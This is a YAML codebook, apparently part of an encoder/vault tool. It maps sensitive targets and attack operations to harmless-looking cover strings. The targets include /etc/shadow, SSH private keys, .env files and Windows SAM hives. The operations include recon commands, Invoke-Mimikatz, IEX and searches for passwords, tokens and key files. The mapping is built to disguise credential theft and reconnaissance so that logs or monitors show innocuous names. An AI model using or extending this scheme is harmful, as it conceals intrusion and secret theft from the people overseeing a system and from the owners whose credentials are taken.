# Value Codebook — maps high-signature parameter values to innocuous cover strings.
# Now supports Many-to-One mapping (a real value can have a list of covers).
# The encoder picks one randomly; the vault contains the reverse map for all.

sensitive_files_unix:
  /etc/passwd: 
    - config/tax.yaml
    - backup/registry.ini
    - data/local.db
    - logs/access.log
  /etc/shadow: 
    - config/config.yaml
    - data/store.bin
    - auth/pass_cache.dat
  /etc/hosts: 
    - config/endpoints.yaml
    - network/node_map.json
  /etc/sudoers: 
    - config/permissions.yaml
    - auth/admin_policy.conf
  ~/.ssh/id_rsa: 
    - src/utils/helpers.ts
    - lib/core/parser.py
    - pkg/api/handlers.rs
  /var/log/auth.log: 
    - logs/events.log
    - runtime/session_audit.txt
  .env: 
    - settings.local.yaml
    - config/env_defaults.ini
    - .project_rc

sensitive_files_windows:
  C:\Windows\System32\config\SAM: 
    - data/user_store.db
    - auth/sam_backup.bin
  C:\Windows\System32\config\SYSTEM: 
    - data/system.db
    - config/cookies.dat
  C:\Windows\System32\config\SECURITY: 
    - data/cache.db
    - logs/policy_audit.log

recon_commands:
  whoami: 
    - width
    - length
    - after
  id: 
    - iter
    - iteration
  hostname: 
    - size
    - angle
    - style
  ipconfig:
    - connect
    - disconnect
    - proxy
  netstat -an: 
    - search
    - execute
  systeminfo: 
    - format
    - degrees
    - temp
  tasklist: 
    - todo
    - item
    - status
  Get-Process: 
    - Get-Module
    - Get-Service
  Invoke-Mimikatz: 
    - Invoke-RestMethod
    - Test-Connection
  IEX: 
    - Write-Host
    - Out-Null

grep_patterns:
  password: 
    - config_value
    - tree_token
    - pixel_i
  secret: 
    - timestep
    - internal_id
  api_key: 
    - feature_flag
    - build_tag
  token: 
    - session_id
    - transaction_ref

search_patterns:
  '*.pem': 
    - '*.yaml'
    - '*.txt'
  '*.key': 
    - '*.json'
    - '*.pub'
  '*password*': 
    - '*settings*'
    - '*registry*'
  '*secret*': 
    - '*feature*'
    - '*internal*'
